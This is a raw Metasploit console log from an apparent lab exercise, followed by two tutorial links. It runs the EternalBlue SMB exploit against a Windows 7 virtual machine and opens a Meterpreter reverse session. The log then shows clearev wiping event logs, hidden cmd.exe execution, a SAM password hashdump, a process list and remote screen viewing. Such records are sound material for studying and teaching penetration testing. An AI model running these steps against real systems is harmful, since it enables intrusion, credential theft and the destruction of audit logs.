[+] 192.168.176.134:445 - The target is vulnerable.
[*] 192.168.176.134:445 - Connecting to target for exploitation.
[+] 192.168.176.134:445 - Connection established for exploitation.
[+] 192.168.176.134:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.176.134:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.176.134:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 48 6f 6d 65 20 42  Windows 7 Home B
[*] 192.168.176.134:445 - 0x00000010  61 73 69 63 20 45 20 37 36 30 31 20 53 65 72 76  asic E 7601 Serv
[*] 192.168.176.134:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 192.168.176.134:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.176.134:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.176.134:445 - Sending all but last fragment of exploit packet
[*] 192.168.176.134:445 - Starting non-paged pool grooming
[+] 192.168.176.134:445 - Sending SMBv2 buffers
[+] 192.168.176.134:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.176.134:445 - Sending final SMBv2 buffers.
[*] 192.168.176.134:445 - Sending last fragment of exploit packet!
[*] 192.168.176.134:445 - Receiving response from exploit packet
[+] 192.168.176.134:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.176.134:445 - Sending egg to corrupted connection.
[*] 192.168.176.134:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 192.168.176.134
[*] Meterpreter session 1 opened (192.168.176.132:4444 -> 192.168.176.134:49185) at 2024-08-18 09:35:00 -0400
[+] 192.168.176.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.176.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.176.134:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes

meterpreter > sysinfo
Computer        : WIN-2I9UQPS7BCS
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > clearev
[*] Wiping 262 records from Application...
[*] Wiping 1137 records from System...
[*] Wiping 307 records from Security...

meterpreter > ls
Listing: C:\Windows\system32
============================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
040777/rwxrwxrwx  0         dir   2009-07-14 01:42:33 -0400  0409
100666/rw-rw-rw-  9600      fil   2024-08-18 10:04:05 -0400  7B296FB0-376B-497e-B012-9C450E1B7327-5P-0.C7483456-A289-439d-8115-601632D005A0
100666/rw-rw-rw-  9600      fil   2024-08-18 10:04:05 -0400  7B296FB0-376B-497e-B012-9C450E1B7327-5P-1.C7483456-A289-439d-8115-601632D005A0
100666/rw-rw-rw-  39424     fil   2009-07-13 21:24:45 -0400  ACCTRES.dll
100777/rwxrwxrwx  24064     fil   2009-07-13 21:38:55 -0400  ARP.EXE
...........................................................................................................................
r
meterpreter > pwd
c:\
meterpreter > whoami
i
meterpreter > cd ..
meterpreter > pwd
c:\
meterpreter > ls
Listing: c:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2024-08-16 03:04:55 -0400  $Recycle.Bin
100444/r--r--r--  8192    fil   2024-08-16 16:31:55 -0400  BOOTSECT.BAK
040777/rwxrwxrwx  4096    dir   2024-08-16 16:31:54 -0400  Boot
040777/rwxrwxrwx  0       dir   2024-08-16 03:07:21 -0400  Config.Msi
040777/rwxrwxrwx  0       dir   2009-07-14 01:08:02 -0400  Documents and Settings
040777/rwxrwxrwx  0       dir   2009-07-13 23:20:08 -0400  PerfLogs
040555/r-xr-xr-x  4096    dir   2024-08-16 03:07:21 -0400  Program Files
040555/r-xr-xr-x  4096    dir   2009-07-14 00:59:53 -0400  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2024-08-16 03:07:21 -0400  ProgramData
040777/rwxrwxrwx  0       dir   2024-08-16 03:04:48 -0400  Recovery
040777/rwxrwxrwx  4096    dir   2024-08-16 03:07:02 -0400  System Volume Information
040555/r-xr-xr-x  4096    dir   2024-08-16 03:04:49 -0400  Users
040777/rwxrwxrwx  16384   dir   2024-08-16 03:05:19 -0400  Windows
100444/r--r--r--  383786  fil   2010-11-20 07:40:08 -0500  bootmgr
000000/---------  0       fif   1969-12-31 19:00:00 -0500  hiberfil.sys
000000/---------  0       fif   1969-12-31 19:00:00 -0500  pagefile.sys

meterpreter > cd Users
meterpreter > ls
Listing: c:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 03:00:50 -0400  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  Default User
040555/r-xr-xr-x  4096  dir   2009-07-14 00:59:13 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:59:13 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2024-08-16 03:05:02 -0400  omkant

meterpreter > dir
Listing: c:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 03:00:50 -0400  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  Default User
040555/r-xr-xr-x  4096  dir   2009-07-14 00:59:13 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:59:13 -0400  desktop.ini
040777/rwxrwxrwx  8192  dir   2024-08-16 03:05:02 -0400  omkant

meterpreter > mkdir omk
Creating directory: omk
meterpreter > dir
Listing: c:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  All Users
040555/r-xr-xr-x  8192  dir   2009-07-14 03:00:50 -0400  Default
040777/rwxrwxrwx  0     dir   2009-07-14 01:08:02 -0400  Default User
040555/r-xr-xr-x  4096  dir   2009-07-14 00:59:13 -0400  Public
100666/rw-rw-rw-  174   fil   2009-07-14 00:59:13 -0400  desktop.ini
040777/rwxrwxrwx  0     dir   2024-08-18 10:34:14 -0400  omk
040777/rwxrwxrwx  8192  dir   2024-08-16 03:05:02 -0400  omkant
......................................................................

meterpreter > execute -h
Usage: execute -f file [options]
Executes a command on the remote machine.

OPTIONS:

    -a   The arguments to pass to the command.
    -c   Channelized I/O (required for interaction).
    -d   The 'dummy' executable to launch when using -m.
    -f   The executable command to run.
    -h   Help menu.
    -H   Create the process hidden from view.
    -i   Interact with the process after creating it.
    -k   Execute process on the meterpreters current desktop
    -m   Execute from memory.
    -p   Execute process in a pty (if available on target platform)
    -s   Execute process in a given session as the session user
    -t   Execute process with currently impersonated thread token
    -z   Execute process in a subshell
meterpreter > 
------------------------------------------------------------
meterpreter > execute -H -i -f cmd.exe
Process 1716 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-----.....................
C:\Windows\system32>

--------------------------------------------------
C:\Windows\system32>cd /USERs
cd /USERs

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C6C6-7535

 Directory of C:\Users

08/18/2024  08:04 PM    <DIR>          .
08/18/2024  08:04 PM    <DIR>          ..
08/18/2024  08:04 PM    <DIR>          omk
08/16/2024  12:35 PM    <DIR>          omkant
07/14/2009  10:29 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  40,513,171,456 bytes free

C:\Users>
-----------------------------------------------------
C:\Users> exit
 exit
meterpreter > 
-----------------------------------------------------
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 81a140eaaa9e3f2c3503f9e60047b6fb...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
omkant:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
--------------------------------------------------
meterpreter > execute -h
Usage: execute -f file [options]
Executes a command on the remote machine.

OPTIONS:

    -a   The arguments to pass to the command.
    -c   Channelized I/O (required for interaction).
    -d   The 'dummy' executable to launch when using -m.
    -f   The executable command to run.
    -h   Help menu.
    -H   Create the process hidden from view.
    -i   Interact with the process after creating it.
    -k   Execute process on the meterpreters current desktop
    -m   Execute from memory.
    -p   Execute process in a pty (if available on target platform)
    -s   Execute process in a given session as the session user
    -t   Execute process with currently impersonated thread token
    -z   Execute process in a subshell
meterpreter > execute -H -i -f cmd.exe
Process 2904 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

--------------------------------------------------
C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : localdomain
   Link-local IPv6 Address . . . . . : fe80::68a6:a19f:6315:c419%11
   IPv4 Address. . . . . . . . . . . : 192.168.176.134
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.176.2

Tunnel adapter isatap.localdomain:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : localdomain

C:\Windows\system32>
----------------------------------------------------------------
C:\Windows\system32>exit
exit
meterpreter > ps

Process List
============

 PID   PPID  Name           Arch  Session  User                    Path
 ---   ----  ----           ----  -------  ----                    ----
 0     0     [System Proce
             ss]
 4     0     System         x64   0
 236   4     smss.exe       x64   0        NT AUTHORITY\SYSTEM     \SystemRoot\System32\sm
                                                                   ss.exe
 248   452   svchost.exe    x64   0        NT AUTHORITY\NETWORK S
                                           ERVICE
 308   300   csrss.exe      x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\csr
                                                                   ss.exe
 356   300   wininit.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\win
                                                                   init.exe
 368   348   csrss.exe      x64   1        NT AUTHORITY\SYSTEM     C:\Windows\system32\csr
                                                                   ss.exe
 396   348   winlogon.exe   x64   1        NT AUTHORITY\SYSTEM     C:\Windows\system32\win
                                                                   logon.exe
 452   356   services.exe   x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\ser
                                                                   vices.exe
 468   356   lsass.exe      x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\lsa
                                                                   ss.exe
 476   356   lsm.exe        x64   0        NT AUTHORITY\SYSTEM     C:\Windows\system32\lsm
                                                                   .exe
 568   452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
 636   452   svchost.exe    x64   0        NT AUTHORITY\NETWORK S
                                           ERVICE
 708   452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
                                           VICE
 780   452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
 804   452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM
 884   780   dwm.exe        x64   1        WIN-2I9UQPS7BCS\omkant  C:\Windows\system32\Dwm
                                                                   .exe
 948   452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
                                           VICE
 1068  452   taskhost.exe   x64   1        WIN-2I9UQPS7BCS\omkant  C:\Windows\system32\tas
                                                                   khost.exe
 1080  348   explorer.exe   x64   1        WIN-2I9UQPS7BCS\omkant  C:\Windows\Explorer.EXE
 1092  452   wmpnetwk.exe   x64   0        NT AUTHORITY\NETWORK S
                                           ERVICE
 1144  452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
                                           VICE
 1324  452   VGAuthService  x64   0        NT AUTHORITY\SYSTEM     C:\Program Files\VMware
             .exe                                                  \VMware Tools\VMware VG
                                                                   Auth\VGAuthService.exe
 1460  452   svchost.exe    x64   0        NT AUTHORITY\LOCAL SER
                                           VICE
 1764  452   svchost.exe    x64   0        NT AUTHORITY\NETWORK S
                                           ERVICE
 1960  452   SearchIndexer  x64   0        NT AUTHORITY\SYSTEM
             .exe
 2368  452   sppsvc.exe     x64   0        NT AUTHORITY\NETWORK S
                                           ERVICE
 2392  452   spoolsv.exe    x64   0        NT AUTHORITY\SYSTEM     C:\Windows\System32\spo
                                                                   olsv.exe
 2404  452   svchost.exe    x64   0        NT AUTHORITY\SYSTEM

meterpreter > 
-------------------------------------------------------------------------------------------
meterpreter > shell
Process 1596 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
C:\Windows\system32>exit
exit
meterpreter > 

------------------------------------------------------------------------
meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /home/kali/FwwMBcJh.html
[*] Streaming...
Missing chrome or resource URL: resource://gre/modules/UpdateListener.jsm
Missing chrome or resource URL: resource://gre/modules/UpdateListener.sys.mjs

------------------------------------------------------------------------------------------
meterpreter > background
[*] Backgrounding session 4...
-------------------------------------------------------------------------------------
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions 4
[*] Starting interaction with 4...

meterpreter > 
------------------------------------------------------------------------------------








===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
===========================================================================================================================
https://www.getastra.com/blog/security-audit/meterpreter-commands-post-exploitation/
https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/#Setup-Used-for-Practicing-Metasploit-Basics
